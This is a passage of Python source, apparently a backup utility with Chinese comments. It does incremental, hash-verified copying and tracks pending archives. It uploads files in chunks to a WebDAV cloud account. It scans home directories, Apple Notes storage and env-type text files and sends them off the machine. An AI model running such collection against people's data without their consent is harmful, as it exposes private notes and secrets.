            free = shutil.disk_usage(path).free
            required = required_bytes + BackupConfig.MIN_FREE_SPACE
            if free < required:
                logging.error(
                    f"磁盘空间不足: 需要至少 {required / (1024 * 1024):.1f}MB，"
                    f"当前可用 {free / (1024 * 1024):.1f}MB"
                )
                return False
            return True
        except (OSError, IOError):
            return True

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"连接 {host}:{port} 失败: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    @staticmethod
    def _state_key(*parts):
        """生成跨平台稳定、与暂存目录位置无关的文件状态键。"""
        return os.path.normpath(os.path.join(*parts)).replace(os.sep, "/")

    @staticmethod
    def _hash_file(file_path):
        digest = hashlib.sha256()
        with open(file_path, "rb") as source:
            for chunk in iter(lambda: source.read(1024 * 1024), b""):
                digest.update(chunk)
        return digest.hexdigest()

    def _file_fingerprint(self, file_path):
        stat = os.stat(file_path)
        return {
            "kind": "file",
            "size": stat.st_size,
            "mtime_ns": stat.st_mtime_ns,
            "sha256": self._hash_file(file_path),
        }

    def _symlink_fingerprint(self, file_path):
        link_target = os.readlink(file_path)
        payload = link_target.encode("utf-8", "surrogateescape")
        stat = os.lstat(file_path)
        return {
            "kind": "symlink",
            "size": len(payload),
            "mtime_ns": stat.st_mtime_ns,
            "sha256": hashlib.sha256(payload).hexdigest(),
        }

    def _path_fingerprint(self, file_path, preserve_symlinks=False):
        if preserve_symlinks and os.path.islink(file_path):
            return self._symlink_fingerprint(file_path)
        return self._file_fingerprint(file_path)

    @staticmethod
    def _entry_matches(entry, fingerprint, compare_content=True):
        if not isinstance(entry, dict):
            return False
        if entry.get("kind") != fingerprint.get("kind"):
            return False
        if entry.get("size") != fingerprint.get("size"):
            return False
        if compare_content and entry.get("sha256") != fingerprint.get("sha256"):
            return False
        return True

    def _rebuild_pending_index(self):
        index = {}
        for archive_key, pending in self._state.get(
                "pending_archives", {}).items():
            if not isinstance(pending, dict):
                continue
            for rel_key, entry in pending.get("files", {}).items():
                index.setdefault(rel_key, []).append(
                    (archive_key, entry))
        self._pending_index = index

    def _pending_contains(self, rel_key, fingerprint):
        """内容已在待上传归档中时，本轮不重复打包和上传。"""
        index = getattr(self, "_pending_index", None)
        if index is None:
            self._rebuild_pending_index()
            index = self._pending_index
        for _, entry in index.get(rel_key, ()):
            if self._entry_matches(entry, fingerprint, compare_content=True):
                return True
        return False

    def _source_change_status(self, rel_key, source_path, preserve_symlinks=False):
        """返回 (内容是否已可靠备份, 当前内容指纹)。"""
        with self._state_lock:
            entry = self._state.get("files", {}).get(rel_key)
            stat = os.lstat(source_path)
            current_kind = (
                "symlink" if preserve_symlinks and os.path.islink(source_path)
                else "file"
            )
            metadata_matches = (
                isinstance(entry, dict)
                and entry.get("kind") == current_kind
                and entry.get("size") == stat.st_size
                and entry.get("mtime_ns") == stat.st_mtime_ns
            )
            last_verified = (
                int(entry.get("verified_at_ns", entry.get("recorded_at_ns", 0)))
                if isinstance(entry, dict) else 0
            )
            verification_age = time.time_ns() - last_verified
            if (metadata_matches
                    and 0 <= verification_age
                    <= self.config.CONTENT_VERIFY_INTERVAL * 1_000_000_000):
                return True, entry

            index = getattr(self, "_pending_index", None)
            if index is None:
                self._rebuild_pending_index()
                index = self._pending_index
            for _, pending_entry in index.get(rel_key, ()):
                if (isinstance(pending_entry, dict)
                        and pending_entry.get("kind") == current_kind
                        and pending_entry.get("size") == stat.st_size
                        and pending_entry.get("mtime_ns") == stat.st_mtime_ns):
                    return True, pending_entry

            fingerprint = self._path_fingerprint(
                source_path, preserve_symlinks=preserve_symlinks)
            if self._entry_matches(entry, fingerprint, compare_content=True):
                # 仅时间戳变化而内容相同时刷新元数据，不触发重新上传。
                updated = dict(fingerprint)
                if "recorded_at_ns" in entry:
                    updated["recorded_at_ns"] = entry["recorded_at_ns"]
                updated["verified_at_ns"] = time.time_ns()
                self._state.setdefault("files", {})[rel_key] = updated
                return True, fingerprint
            if self._pending_contains(rel_key, fingerprint):
                return True, fingerprint
            return False, fingerprint

    def _copy_file_atomic(self, source, target):
        """原子复制并校验源文件在复制期间未发生变化。"""
        directory = os.path.dirname(target) or "."
        os.makedirs(directory, exist_ok=True)
        digest = hashlib.sha256()
        fd = None
        temporary = None
        size = 0
        try:
            fd, temporary = tempfile.mkstemp(
                prefix=".copy-", suffix=".partial", dir=directory)
            with os.fdopen(fd, "wb") as destination, open(source, "rb") as origin:
                fd = None
                before = os.fstat(origin.fileno())
                while True:
                    block = origin.read(self.config.COPY_CHUNK_SIZE)
                    if not block:
                        break
                    destination.write(block)
                    digest.update(block)
                    size += len(block)
                after = os.fstat(origin.fileno())
                destination.flush()
                os.fsync(destination.fileno())
            current = os.stat(source)
            if (size != before.st_size or before.st_mtime_ns != after.st_mtime_ns
                    or before.st_size != after.st_size
                    or before.st_ino != current.st_ino
                    or after.st_mtime_ns != current.st_mtime_ns
                    or after.st_size != current.st_size):
                raise OSError("复制期间源文件发生变化")
            shutil.copystat(source, temporary)
            os.replace(temporary, target)
            temporary = None
            return {"size": size, "sha256": digest.hexdigest()}
        finally:
            if fd is not None:
                os.close(fd)
            if temporary and os.path.exists(temporary):
                os.remove(temporary)

    def _copy_if_changed(self, source_path, target_path, rel_key, changed_records,
                         preserve_symlinks=False):
        """仅复制新增或内容变化的文件；返回 copied / skipped / failed。"""
        try:
            if rel_key in changed_records:
                return "skipped"
            unchanged, fingerprint = self._source_change_status(
                rel_key, source_path, preserve_symlinks=preserve_symlinks)
            if unchanged:
                return "skipped"

            target_dir = os.path.dirname(target_path) or "."
            if not self._ensure_directory(target_dir):
                return "failed"
            if not self._ensure_free_space(int(fingerprint.get("size", 0)), target_dir):
                return "failed"

            if fingerprint.get("kind") == "symlink":
                if os.path.lexists(target_path):
                    if os.path.isdir(target_path) and not os.path.islink(target_path):
                        shutil.rmtree(target_path)
                    else:
                        os.remove(target_path)
                os.symlink(os.readlink(source_path), target_path)
            else:
                copied = self._copy_file_atomic(source_path, target_path)
                if (copied.get("size") != fingerprint.get("size")
                        or copied.get("sha256") != fingerprint.get("sha256")):
                    try:
                        os.remove(target_path)
                    except OSError:
                        pass
                    logging.error(f"❌ 复制后内容校验失败: {rel_key}")
                    return "failed"

            changed_records[rel_key] = fingerprint
            return "copied"
        except Exception as exc:
            try:
                if os.path.lexists(target_path) and not os.path.isdir(target_path):
                    os.remove(target_path)
            except OSError:
                pass
            logging.error(f"❌ 增量备份失败: {rel_key} - {exc}")
            return "failed"

    def _copy_tree_if_changed(self, source, target_root, key_prefix, changed_records,
                              exclude_names=()):
        """增量复制目录树，返回 (是否完整, 扫描数, 跳过数, 失败数)。"""
        complete = True
        seen = skipped = failed = 0
        excluded = {name.casefold() for name in exclude_names}
        try:
            for root, directories, files in os.walk(source, topdown=True, followlinks=False):
                directories[:] = [
                    name for name in directories
                    if name.casefold() not in excluded
                ]
                relative_root = os.path.relpath(root, source)
                target_dir = (
                    target_root if relative_root == "."
                    else os.path.join(target_root, relative_root)
                )
                if not self._ensure_directory(target_dir):
                    complete = False
                    failed += 1
                    continue

                for name in list(directories):
                    candidate = os.path.join(root, name)
                    if not os.path.islink(candidate):
                        continue
                    relative = self._state_key(relative_root, name)
                    seen += 1
                    status = self._copy_if_changed(
                        candidate, os.path.join(target_dir, name),
                        self._state_key(key_prefix, relative),
                        changed_records, preserve_symlinks=True,
                    )
                    skipped += status == "skipped"
                    failed += status == "failed"
                    complete = complete and status != "failed"
                    directories.remove(name)

                for name in files:
                    if name.casefold() in excluded:
                        continue
                    source_file = os.path.join(root, name)
                    relative = self._state_key(relative_root, name)
                    seen += 1
                    status = self._copy_if_changed(
                        source_file, os.path.join(target_dir, name),
                        self._state_key(key_prefix, relative),
                        changed_records, preserve_symlinks=True,
                    )
                    skipped += status == "skipped"
                    failed += status == "failed"
                    complete = complete and status != "failed"
            return complete, seen, skipped, failed
        except Exception as exc:
            logging.error(f"❌ 增量复制目录失败 {source}: {exc}")
            return False, seen, skipped, failed + 1

    def _load_backup_state(self):
        """读取内容指纹和待上传归档记录。"""
        state = _empty_backup_state()
        try:
            state_path = self.config.BACKUP_STATE_FILE
            if not os.path.exists(state_path):
                return state
            with open(state_path, "r", encoding="utf-8") as source:
                loaded = json.load(source)
            if isinstance(loaded, dict):
                files = loaded.get("files")
                pending = loaded.get("pending_archives")
                if isinstance(files, dict):
                    state["files"] = {
                        key: value for key, value in files.items()
                        if isinstance(value, dict)
                    }
                if isinstance(pending, dict):
                    state["pending_archives"] = {
                        key: value for key, value in pending.items()
                        if isinstance(value, dict) and isinstance(value.get("files"), dict)
                    }
        except Exception as exc:
            logging.error(f"读取备份状态失败，将重新建立索引: {exc}")
        return state

    def _save_backup_state(self):
        """原子写入内容指纹状态，避免进程中断损坏索引。"""
        try:
            with self._state_lock:
                state_path = Path(self.config.BACKUP_STATE_FILE)
                state_path.parent.mkdir(parents=True, exist_ok=True)
                temporary = state_path.with_name(
                    f".{state_path.name}.tmp-{os.getpid()}-{threading.get_ident()}"
                )
                with open(temporary, "w", encoding="utf-8") as target:
                    json.dump(self._state, target, ensure_ascii=False, indent=2)
                os.chmod(temporary, 0o600)
                os.replace(temporary, state_path)
                os.chmod(state_path, 0o600)
        except Exception as exc:
            logging.error(f"保存备份状态失败: {exc}")

    def _known_state_source_path(self, rel_key):
        prefixes = (
            ("mac:home/", os.path.expanduser("~")),
            (CUSTOM_DATA_STATE_PREFIX, os.path.join(
                self.config.BACKUP_ROOT, "data")),
            ("notes/", os.path.expanduser(
                "~/Library/Group Containers/group.com.apple.notes")),
        )
        for prefix, source_root in prefixes:
            if not rel_key.startswith(prefix):
                continue
            relative = rel_key[len(prefix):]
            relative_path = Path(relative)
            if (relative_path.is_absolute()
                    or any(part in ("", ".", "..")
                           for part in relative_path.parts)):
                return None
            return os.path.join(source_root, *relative_path.parts)
        return None

    def prune_stale_state(self):
        """删除长期不存在且属于已知源目录的内容指纹。"""
        cutoff_ns = time.time_ns() - (
            self.config.STATE_RETENTION_DAYS * 24 * 60 * 60 * 1_000_000_000)
        removed = 0
        with self._state_lock:
            files = self._state.setdefault("files", {})
            for rel_key, entry in list(files.items()):
                if not isinstance(entry, dict):
                    continue
                recorded_at = int(entry.get("recorded_at_ns", 0))
                if not recorded_at or recorded_at >= cutoff_ns:
                    continue
                source_path = self._known_state_source_path(rel_key)
                if source_path and not os.path.lexists(source_path):
                    files.pop(rel_key, None)
                    removed += 1
            if removed:
                self._rebuild_pending_index()
                self._save_backup_state()
                logging.info(f"🧹 已清理 {removed} 条失效的历史文件指纹")
        return removed

    def register_pending_archive(self, archive_path, file_records):
        """归档生成后先登记 pending；上传成功前对应内容不会重复打包。"""
        if not file_records:
            return
        key = archive_group_key(archive_path)
        with self._state_lock:
            pending = self._state.setdefault("pending_archives", {})
            if key in pending:
                raise RuntimeError(f"pending 归档键已存在，拒绝覆盖: {key}")
            pending[key] = {
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "created_at_ns": time.time_ns(),
                "files": dict(file_records),
            }
            self._rebuild_pending_index()
            self._save_backup_state()

    def mark_archive_uploaded(self, archive_key):
        """仅在整个归档组上传成功后，提交文件内容指纹。"""
        key = archive_group_key(archive_key)
        pending_files = {}
        with self._state_lock:
            pending = self._state.setdefault("pending_archives", {}).pop(key, None)
            if not pending:
                return
            pending_files = pending.get("files", {})
            pending_time = pending.get("created_at_ns", 0)
            for rel_key, fingerprint in pending_files.items():
                if not isinstance(fingerprint, dict):
                    continue
                existing = self._state.setdefault("files", {}).get(rel_key, {})
                if pending_time < existing.get("recorded_at_ns", 0):
                    continue
                updated = dict(fingerprint)
                updated["recorded_at_ns"] = pending_time
                self._state["files"][rel_key] = updated
            self._rebuild_pending_index()
            self._save_backup_state()

        deleted_files = self._cleanup_uploaded_custom_data(pending_files)
        if deleted_files:
            logging.info(f"🧹 已清理 {deleted_files} 个已上传的自定义数据文件")

    def _cleanup_uploaded_custom_data(self, file_records=None):
        """隔离校验后删除已上传文件，避免检查与删除之间误删新写入。"""
        data_dir = os.path.abspath(os.path.join(
            self.config.BACKUP_ROOT, "data"))
        if not os.path.isdir(data_dir):
            return 0
        quarantine_root = os.path.join(
            self.config.BACKUP_ROOT, ".custom-data-cleanup")
        self._recover_custom_data_quarantine(data_dir, quarantine_root)

        if file_records is None:
            with self._state_lock:
                file_records = dict(self._state.get("files", {}))

        deleted_files = 0
        for rel_key, uploaded in file_records.items():
            if (not rel_key.startswith(CUSTOM_DATA_STATE_PREFIX)
                    or not isinstance(uploaded, dict)):
                continue

            relative = rel_key[len(CUSTOM_DATA_STATE_PREFIX):]
            relative_path = Path(relative)
            if (relative_path.is_absolute()
                    or any(part in ("", ".", "..") for part in relative_path.parts)):
                logging.warning(f"⚠️ 忽略不安全的自定义数据状态路径: {rel_key}")
                continue

            source_path = os.path.join(data_dir, *relative_path.parts)
            quarantine_path = os.path.join(
                quarantine_root, *relative_path.parts)
            try:
                if not os.path.lexists(source_path):
                    continue
                os.makedirs(os.path.dirname(quarantine_path), exist_ok=True)
                if os.path.lexists(quarantine_path):
                    self._restore_quarantined_file(
                        quarantine_path, source_path)
                    continue
                os.rename(source_path, quarantine_path)

                if os.path.islink(quarantine_path):
                    current = self._symlink_fingerprint(quarantine_path)
                    stable = True
                elif os.path.isfile(quarantine_path):
                    before = os.stat(quarantine_path)
                    current = self._file_fingerprint(quarantine_path)
                    after = os.stat(quarantine_path)
                    stable = (
                        before.st_dev, before.st_ino, before.st_size,
                        before.st_mtime_ns,
                    ) == (
                        after.st_dev, after.st_ino, after.st_size,
                        after.st_mtime_ns,
                    )
                else:
                    current = None
                    stable = False

                if stable and self._entry_matches(uploaded, current or {}):
                    os.remove(quarantine_path)
                    deleted_files += 1
                else:
                    self._restore_quarantined_file(
                        quarantine_path, source_path)
            except OSError as exc:
                logging.warning(
                    f"⚠️ 清理已上传自定义数据失败 {source_path}: {exc}")

        if deleted_files:
            for root, _, _ in os.walk(data_dir, topdown=False, followlinks=False):
                if os.path.normcase(root) == os.path.normcase(data_dir):
                    continue
                try:
                    if not os.listdir(root):
                        os.rmdir(root)
                except OSError:
                    pass
            self._remove_empty_tree(quarantine_root)
        return deleted_files

    @staticmethod
    def _restore_quarantined_file(quarantine_path, source_path):
        """恢复未确认删除的文件；目标冲突时保留可识别的恢复副本。"""
        os.makedirs(os.path.dirname(source_path), exist_ok=True)
        destination = source_path
        if os.path.lexists(source_path):
            destination = (
                f"{source_path}.recovered-{time.time_ns()}"
            )
        os.rename(quarantine_path, destination)
        logging.warning(f"⚠️ 已恢复未确认删除的数据文件: {destination}")

    def _recover_custom_data_quarantine(self, data_dir, quarantine_root):
        """启动清理前恢复上次中断遗留的隔离文件。"""
        if not os.path.isdir(quarantine_root):
            return
        for root, dirs, files in os.walk(
                quarantine_root, topdown=False, followlinks=False):
            entries = list(files)
            entries.extend(
                name for name in dirs
                if os.path.islink(os.path.join(root, name)))
            for name in entries:
                quarantine_path = os.path.join(root, name)
                relative = os.path.relpath(quarantine_path, quarantine_root)
                source_path = os.path.join(data_dir, relative)
                try:
                    self._restore_quarantined_file(
                        quarantine_path, source_path)
                except OSError as exc:
                    logging.error(f"❌ 恢复隔离数据失败 {quarantine_path}: {exc}")
        self._remove_empty_tree(quarantine_root)

    @staticmethod
    def _remove_empty_tree(root_path):
        if not os.path.isdir(root_path):
            return
        for root, _, _ in os.walk(
                root_path, topdown=False, followlinks=False):
            try:
                if not os.listdir(root):
                    os.rmdir(root)
            except OSError:
                pass

    def reconcile_pending_archives(self, existing_keys, key_prefixes=None):
        """移除本地已不存在的 pending 归档，让对应文件下次重新备份。"""
        existing = set(existing_keys)
        prefixes = tuple(key_prefixes or ())
        with self._state_lock:
            pending = self._state.setdefault("pending_archives", {})
            stale_keys = [
                key for key in pending
                if key not in existing and (not prefixes or key.startswith(prefixes))
            ]
            if not stale_keys:
                return
            for key in stale_keys:
                pending.pop(key, None)
            self._rebuild_pending_index()
            logging.warning(f"⚠️ 清理 {len(stale_keys)} 个已不存在的待上传归档记录")
            self._save_backup_state()

    def _safe_remove_file(self, file_path, retry=True):
        """安全删除文件，支持重试机制
        
        Args:
            file_path: 要删除的文件路径
            retry: 是否使用重试机制
            
        Returns:
            bool: 删除是否成功
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # 使用重试机制删除文件
        try:
            # 等待文件句柄完全释放
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"删除文件重试中: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"删除文件失败: {str(e)}")
            return False

    def _is_inside_cloud_root(self, path):
        """判断路径是否位于显式配置的云盘根目录内。"""
        abspath = os.path.normcase(os.path.abspath(path))
        for cloud_root in self.config.CLOUD_SCAN_ROOTS:
            root = os.path.normcase(os.path.abspath(os.path.expanduser(cloud_root)))
            if abspath == root or abspath.startswith(root + os.sep):
                return True
        return False

    def _is_ancestor_of_cloud_root(self, path):
        """判断路径是否是某个云盘根目录的祖先（扫描时需要保留其子目录）。"""
        abspath = os.path.normcase(os.path.abspath(path))
        for cloud_root in self.config.CLOUD_SCAN_ROOTS:
            root = os.path.normcase(os.path.abspath(os.path.expanduser(cloud_root)))
            if root.startswith(abspath + os.sep):
                return True
        return False

    def _filter_child_dirs_to_cloud_roots(self, parent, dirs):
        """仅在扫描穿透云盘祖先目录时，保留可能到达云盘根目录的子目录。"""
        parent_abs = os.path.normcase(os.path.abspath(parent))
        keep = []
        for dir_name in dirs:
            child = os.path.normcase(os.path.abspath(os.path.join(parent, dir_name)))
            if self._is_inside_cloud_root(child) or self._is_ancestor_of_cloud_root(child):
                keep.append(dir_name)
        dirs[:] = keep

    def should_exclude_dir(self, path):
        """检查是否应该排除目录。

        Args:
            path: 目录路径

        Returns:
            bool: 是否应该排除
        """
        # 优先排除备份根目录自身，避免自我备份
        backup_root = os.path.normcase(os.path.abspath(self.config.BACKUP_ROOT))
        abspath = os.path.normcase(os.path.abspath(path))
        if abspath == backup_root or abspath.startswith(backup_root + os.sep):
            return True

        # 显式配置的云盘目录不按普通规则排除
        if self._is_inside_cloud_root(abspath):
            return False

        # 云盘关键词集合（O(1) 查找），保留按完整路径段命中的云盘目录。
        cloud_keywords_set = {
            "云盘", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "网盘", "云"
        }

        path_parts = [part.lower() for part in os.path.normpath(abspath).split(os.sep) if part]

        # 检查是否是云盘目录（按完整路径段匹配）
        for part in path_parts:
            if part in cloud_keywords_set:
                return False

        # 使用预编译的集合快速检查排除目录（O(1) 查找）
        for part in path_parts:
            part_normalized = part.replace('_', ' ').replace('-', ' ')
            if part_normalized in self._exclude_dirs_set:
                return True

        # 使用预编译的正则表达式快速匹配，但只有完整路径段命中关键词时才排除，
        # 避免 catalog 等仅包含 log 子串的目录被误伤。
        if self._exclude_keywords_pattern.search(os.path.sep.join(path_parts)):
            for part in path_parts:
                normalized_part = part.replace('_', ' ').replace('-', ' ').replace('.', ' ')
                word_parts = set(normalized_part.split())
                for keyword in self.config.EXCLUDE_KEYWORDS:
                    keyword_parts = set(keyword.lower().replace('_', ' ').replace('-', ' ').split())
                    if keyword_parts and keyword_parts.issubset(word_parts):
                        return True

        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1,
                          state_namespace=None):
        """按文件内容指纹备份磁盘文件，只复制新增或内容变化的文件。"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if extensions_type == 4:
            if self.config.DEBUG_MODE:
                logging.debug("使用指定文件备份流程")
            return self.backup_specified_files(
                source_dir, target_dir, state_namespace=state_namespace)

        if self.config.DEBUG_MODE:
            logging.debug("开始备份目录:")
            logging.debug("源目录: %s", source_dir)
            logging.debug("目标目录: %s", target_dir)
            logging.debug("扩展名类型: %d", extensions_type)

        if not os.path.exists(source_dir):
            logging.error("❌ 磁盘源目录不存在: %s", source_dir)
            return BackupResult(None, "failed", missing_files=[source_dir])
        if not os.access(source_dir, os.R_OK):
            logging.error("❌ 源目录没有读取权限: %s", source_dir)
            return BackupResult(None, "failed", missing_files=[source_dir])
        if not self._ensure_free_space(0, os.path.dirname(target_dir) or target_dir):
            return BackupResult(None, "failed", missing_files=[source_dir])
        if not self._clean_directory(target_dir):
            logging.error("❌ 无法清理或创建目标目录: %s", target_dir)
            return BackupResult(None, "failed", missing_files=[source_dir])

        extensions = (
            self.config.DISK_EXTENSIONS_1 if extensions_type == 1
            else self.config.DISK_EXTENSIONS_2
        )
        state_namespace = state_namespace or f"disk:{Path(target_dir).name}"
        changed_records = {}
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0
        excluded_dirs = 0
        skipped_files = 0
        unchanged_files = 0
        matched_files = 0
        failed_files = []
        timed_out = False

        macos_mime_types = {
            'pages': ['application/x-iwork-pages-sffpages'],
            'numbers': ['application/x-iwork-numbers-sffnumbers'],
        }
        plain_text_types = ['text/plain', 'text/x-env', 'text/rtf']

        try:
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"❌ 扫描目录超时: {source_dir}")
                    timed_out = True
                    break
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(
                            "⏳ 已扫描 %d 个目录，匹配 %d 个文件，未变化 %d 个",
                            scanned_dirs, matched_files, unchanged_files)
                    last_progress_time = current_time

                root_abs = os.path.abspath(root)
                target_abs = os.path.abspath(target_dir)
                if root_abs == target_abs or root_abs.startswith(target_abs + os.sep):
                    continue
                if root != source_dir and self._is_ancestor_of_cloud_root(root):
                    self._filter_child_dirs_to_cloud_roots(root, dirs)
                    continue
                if root != source_dir and self.should_exclude_dir(root):
                    excluded_dirs += 1
                    if self._is_ancestor_of_cloud_root(root):
                        self._filter_child_dirs_to_cloud_roots(root, dirs)
                    else:
                        dirs.clear()
                    continue

                for file in files:
                    file_lower = file.lower()
                    source_file = os.path.join(root, file)
                    should_backup = any(
                        file_lower.endswith(ext.lower()) for ext in extensions)
                    if not should_backup and '.' not in file:
                        try:
                            file_type = subprocess.check_output(
                                ['file', '-b', '--mime-type', source_file]
                            ).decode('utf-8').strip()
                            should_backup = (
                                any(file_type in mime_list
                                    for mime_list in macos_mime_types.values())
                                or file_type in plain_text_types
                            )
                        except Exception as exc:
                            if self.config.DEBUG_MODE:
                                logging.debug(
                                    f"文件类型检测失败: {source_file} - {exc}")
                    if not should_backup:
                        skipped_files += 1
                        continue

                    matched_files += 1
                    relative_path = os.path.relpath(root, source_dir)
                    rel_key = self._state_key(
                        state_namespace, relative_path, file)
                    target_sub_dir = os.path.join(target_dir, relative_path)
                    target_file = os.path.join(target_sub_dir, file)
                    status = "failed"
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        status = self._copy_if_changed(
                            source_file, target_file, rel_key, changed_records,
                            preserve_symlinks=True)
                        if status != "failed":
                            break
                        if attempt < self.config.FILE_RETRY_COUNT - 1:
                            time.sleep(self.config.FILE_RETRY_DELAY)
                    if status == "copied":
                        files_count += 1
                        total_size += int(changed_records[rel_key].get("size", 0))
                    elif status == "skipped":
                        unchanged_files += 1
                    else:
                        failed_files.append(source_file)

        except (OSError, IOError, PermissionError) as exc:
            failed_files.append(source_file if 'source_file' in locals() else source_dir)
            logging.error(f"❌ 备份过程出错: {exc}")
        except Exception as exc:
            failed_files.append(source_dir)
            logging.error(f"❌ 备份过程出现未知错误: {exc}")

        missing_files = list(dict.fromkeys(failed_files))
        if timed_out:
            missing_files.append(f"<扫描超时:{source_dir}>")

        if matched_files == 0:
            self._save_backup_state()
            if missing_files:
                logging.error("❌ 扫描未完整完成，未找到可确认的文件")
                return BackupResult(
                    target_dir, "partial", missing_files=missing_files,
                    copied_files=0, skipped_files=skipped_files,
                    changed_records=changed_records,
                )
            logging.info("ℹ️ 未找到符合当前类别规则的文件")
            return BackupResult(
                target_dir, "success", missing_files=[],
                copied_files=0, skipped_files=skipped_files,
                changed_records=changed_records,
            )

        status = "partial" if missing_files else "success"
        if files_count:
            logging.info(
                f"📊 备份完成: 新增/更新 {files_count} 个文件 "
                f"({total_size / 1024 / 1024:.1f}MB)，"
                f"未变化跳过 {unchanged_files} 个")
        else:
            logging.info(f"⏭️ 文件内容均未变化，跳过 {unchanged_files} 个文件")
        if missing_files:
            logging.warning(f"⚠️ 备份部分完成: 失败/遗漏 {len(missing_files)} 个文件")

        self._save_backup_state()
        return BackupResult(
            target_dir, status, missing_files=missing_files,
            copied_files=files_count,
            skipped_files=skipped_files + unchanged_files,
            failed_files=missing_files, changed_records=changed_records,
        )
    
    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表；不需要分片时返回空列表；分片失败返回 None。
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return []
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._clean_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files is None:
            # 分片失败，绝不能退化为删除原文件的单文件上传。
            logging.error(f"文件分片失败，保留原备份文件: {file_path}")
            return False
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 仅在全部分片上传成功后清理分片目录与原始文件
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                # 若原始文件仍在，上传成功后删除
                if os.path.exists(file_path):
                    self._safe_remove_file(file_path, retry=True)
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir, infini_url=None, auth=None):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True

        if not infini_url:
            infini_url = self.infini_url
        if auth is None:
            auth = self.auth
        
        try:
            # 构建目录路径
            dir_path = f"{infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir, infini_url=infini_url, auth=auth):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path, infini_config):
        """使用指定的 Infini 配置上传单个文件（使用 WebDAV PUT 方法）。"""
        try:
            config_name = infini_config.get("name", "Infini Cloud")
            infini_url = infini_config.get("url", "").strip()
            infini_user = infini_config.get("user", "").strip()
            infini_password = infini_config.get("password", "")

            if not infini_url or not infini_user or not infini_password:
                logging.error(f"❌ [{config_name}] 配置不完整，跳过")
                return False

            auth = HTTPBasicAuth(infini_user, infini_password)

            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 构建远程路径
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
